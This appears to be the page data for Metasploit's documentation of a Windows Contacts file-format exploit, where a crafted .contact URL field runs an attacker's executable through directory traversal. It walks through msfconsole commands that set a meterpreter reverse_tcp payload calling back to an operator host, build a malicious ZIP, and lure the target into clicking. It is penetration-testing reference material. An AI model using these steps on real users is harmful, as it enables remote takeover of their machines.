{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/fileformat/microsoft_windows_contact","result":{"data":{"moduleMetadataJson":{"id":"972c83fe-b115-5d46-8e2f-46127478a046","name":"Microsoft Windows Contact File Format Arbitary Code Execution","fullname":"exploit/windows/fileformat/microsoft_windows_contact","description":"This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Microsoft Windows.\n        User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw is due to the processing of \".contact\" files <c:Url> node param which takes an expected website value, however if an attacker references an\n        executable file it will run that instead without warning instead of performing expected web navigation. This is dangerous and would be unexpected to an end user.\n        Executable files can live in a sub-directory so when the \".contact\" website link is clicked it traverses directories towards the executable and runs.\n        Making matters worse is if the the files are compressed then downloaded \"mark of the web\" (MOTW) may potentially not work as expected with certain archive utilitys.\n        The \".\\\" chars allow directory traversal to occur in order to run the attackers supplied executable sitting unseen in the attackers directory.\n        This advisory is a duplicate issue that currently affects Windows .VCF files, and released for the sake of completeness as it affects Windows .contact files as well.","rank":300,"fields":{"detailsSlug":"/modules/details/exploit/windows/fileformat/microsoft_windows_contact","documentationSlug":"/modules/documentation/exploit/windows/fileformat/microsoft_windows_contact"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module allows remote attackers to execute arbitrary code on vulnerable\ninstallations of Microsoft Windows.  User interaction is required to exploit\nthis vulnerability in that the target must visit a malicious page or open a\nmalicious file.  The flaw is due to the processing of \".contact\" files &#x3C;c:Url>\nnode param which takes an expected website value, however if an attacker\nreferences an executable file it will run that instead without warning instead\nof performing expected web navigation.  This is dangerous and would be\nunexpected to an end user.</p>\n<p>Executable files can live in a sub-directory so when the \".contact\" website link\nis clicked it traverses directories towards the executable and runs.  Making\nmatters worse is if the the files are compressed then downloaded \"mark of the\nweb\" (MOTW) may potentially not work as expected with certain archive utilitys.\nThe \".\" chars allow directory traversal to occur in order to run the attackers\nsupplied executable sitting unseen in the attackers directory.  This advisory is\na duplicate issue that currently affects Windows .VCF files, and released for\nthe sake of completeness as it affects Windows .contact files as well.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Windows Contacts\n(tested on Windows 10.0.18282)</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li><code class=\"language-text\">./msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/windows/fileformat/microsoft_windows_contact</code></li>\n<li>Configure the payload.  For example: <code class=\"language-text\">set PAYLOAD windows/x64/meterpreter/bind_tcp</code></li>\n<li>Configure the payload parameters.  For example: <code class=\"language-text\">set LHOST 192.168.1.1</code></li>\n<li>Enter the name of the user to be embedded in the contact, which will also be used as the filename for the .ZIP and .CONTACTS files.  For example, <code class=\"language-text\">set FILENAME John Smith</code></li>\n<li>Enter the fake URL that the user must click to launch the payload.  Note, this does not need to be a valid domain.  For example: <code class=\"language-text\">set WEBSITE metasploit.com</code></li>\n<li><code class=\"language-text\">run</code></li>\n<li>Confirm the ZIP file was created, and that it contains a <code class=\"language-text\">.CONTACT</code> file along with a payload in the <code class=\"language-text\">http</code> folder.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"exploiting-a-windows-10-host\" style=\"position:relative;\"><a href=\"#exploiting-a-windows-10-host\" aria-label=\"exploiting a windows 10 host permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploiting a Windows 10 host</h3>\n<ol>\n<li>Configure the module-specific settings.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/fileformat/microsoft_windows_contact) &gt; set WEBSITE metasploit.com\nWEBSITE =&gt; metasploit.com\nmsf5 exploit(windows/fileformat/microsoft_windows_contact) &gt; set FILENAME John Smith\nFILENAME =&gt; John Smith</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"2\">\n<li>\n<p>Configure the payload.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/fileformat/microsoft_windows_contact) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\nmsf5 exploit(windows/fileformat/microsoft_windows_contact) &gt; set LHOST 192.168.1.148\nLHOST =&gt; 192.168.1.148\nmsf5 exploit(windows/fileformat/microsoft_windows_contact) &gt; run</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<p>[+] Creating 'John Smith.zip'</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">3. Send the ZIP to the target machine.\n\n4. On the target machine, extract the ZIP file, open the .CONTACT file in the Windows Contacts viewer, and click the URL in the &quot;Website&quot; field.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"972c83fe-b115-5d46-8e2f-46127478a046"}}}